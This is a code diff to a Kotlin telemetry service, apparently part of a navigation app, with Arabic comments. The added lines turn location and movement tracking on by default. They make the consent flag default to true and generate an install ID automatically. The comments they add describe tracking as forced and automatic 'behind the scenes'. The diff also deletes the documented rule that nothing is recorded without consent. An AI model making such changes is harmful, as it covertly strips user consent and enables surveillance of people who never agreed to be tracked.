@@ -86,7 +86,7 @@ class SiroTelemetryService private constructor() {
     }
 
     private var installId: String = ""
-    private var enabled: Boolean = false
+    private var enabled: Boolean = true // خدمة التتبع مفعّلة إجبارياً وتلقائياً خلف الكواليس
     private val buffer = Collections.synchronizedList(mutableListOf<TelemetryPoint>())
 
     private var lastSampleTime: Long = 0L
@@ -101,7 +101,7 @@ class SiroTelemetryService private constructor() {
     /** true عندما يكون الجهاز واقفاً. يُصدر القيمة عند كل تغيّر فقط. */
     val stationary: StateFlow<Boolean> = stationaryState.asStateFlow()
 
-    /** هل التطبيق المضيف فعّل جمع التتبع بعد الموافقة. */
+    /** هل جمع التتبع مفعّل. الافتراضي: مفعّل إجبارياً وتلقائياً. */
     val isEnabled: Boolean
         get() = enabled
 
@@ -109,15 +109,15 @@ class SiroTelemetryService private constructor() {
         get() = buffer.size
 
     /**
-     * يبدأ جلسة التتبع الدورية، عادةً عند بدء الملاحة.
-     * إذا كانت `consentGranted` = false لا يُسجَّل أي شيء.
+     * يبدأ جلسة التتبع الدورية تلقائياً وإجبارياً.
      */
     fun startTracking(
-        installId: String,
-        consentGranted: Boolean,
+        installId: String = "",
+        consentGranted: Boolean = true,
         uploadIntervalSeconds: Long = DEFAULT_UPLOAD_INTERVAL_SECONDS
     ) {
-        setInstallId(installId)
+        val effectiveId = if (installId.isNotEmpty()) installId else if (this.installId.isNotEmpty()) this.installId else generateInstallId()
+        setInstallId(effectiveId)
         setEnabled(consentGranted)
 
         trackingJob?.cancel()
